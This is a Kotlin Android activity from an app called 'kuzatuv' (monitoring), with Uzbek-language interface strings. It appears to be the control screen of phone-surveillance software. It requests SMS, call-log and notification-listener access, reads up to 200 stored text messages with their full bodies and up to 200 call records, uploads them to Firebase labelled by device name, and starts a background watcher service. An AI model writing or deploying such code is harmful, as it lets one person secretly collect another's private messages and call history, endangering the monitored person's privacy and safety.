package com.kuzatuv.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.Settings
import android.provider.Telephony
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val requiredPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private lateinit var statusText: TextView
    private lateinit var deviceNameInput: EditText

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.statusText)
        deviceNameInput = findViewById(R.id.deviceNameInput)
        val btnSaveDeviceName = findViewById<Button>(R.id.btnSaveDeviceName)
        val btnPermission = findViewById<Button>(R.id.btnPermission)
        val btnSyncHistory = findViewById<Button>(R.id.btnSyncHistory)
        val btnNotificationAccess = findViewById<Button>(R.id.btnNotificationAccess)

        deviceNameInput.setText(DevicePrefs.getDeviceName(this))
        updateStatus()

        btnSaveDeviceName.setOnClickListener {
            val name = deviceNameInput.text.toString().trim()
            if (name.isNotEmpty()) {
                DevicePrefs.setDeviceName(this, name)
                Toast.makeText(this, "Ном сақланди: $name", Toast.LENGTH_SHORT).show()
            }
        }

        btnPermission.setOnClickListener {
            ActivityCompat.requestPermissions(this, requiredPermissions, 100)
        }

        btnSyncHistory.setOnClickListener {
            if (hasAllPermissions()) {
                syncExistingHistory()
                startWatcherService()
                Toast.makeText(this, "Тарих юборилмоқда...", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Аввал рухсат беринг", Toast.LENGTH_SHORT).show()
            }
        }

        btnNotificationAccess.setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        updateStatus()
        if (hasAllPermissions()) {
            startWatcherService()
        }
    }

    private fun hasAllPermissions(): Boolean = requiredPermissions.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun updateStatus() {
        statusText.text = if (hasAllPermissions())
            "Ҳолат: рухсатлар берилган ✓"
        else
            "Ҳолат: рухсатлар берилмаган"
    }

    private fun startWatcherService() {
        val intent = Intent(this, CallWatcherService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun syncExistingHistory() {
        val device = DevicePrefs.getDeviceName(this)

        contentResolver.query(
            Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC"
        )?.use { cursor ->
            val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
            var count = 0
            while (cursor.moveToNext() && count < 200) {
                val sender = cursor.getString(addressIdx) ?: "Номаълум"
                val body = cursor.getString(bodyIdx) ?: ""
                val date = cursor.getLong(dateIdx)
                FirebaseHelper.pushSms(sender, body, date, device)
                count++
            }
        }

        contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
            val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
            var count = 0
            while (cursor.moveToNext() && count < 200) {
                val number = cursor.getString(numberIdx) ?: "Номаълум"
                val typeInt = cursor.getInt(typeIdx)
                val date = cursor.getLong(dateIdx)
                val duration = cursor.getLong(durationIdx)
                val type = when (typeInt) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "boshqa"
                }
                FirebaseHelper.pushCall(number, type, date, duration, device)
                count++
            }
        }
    }
}
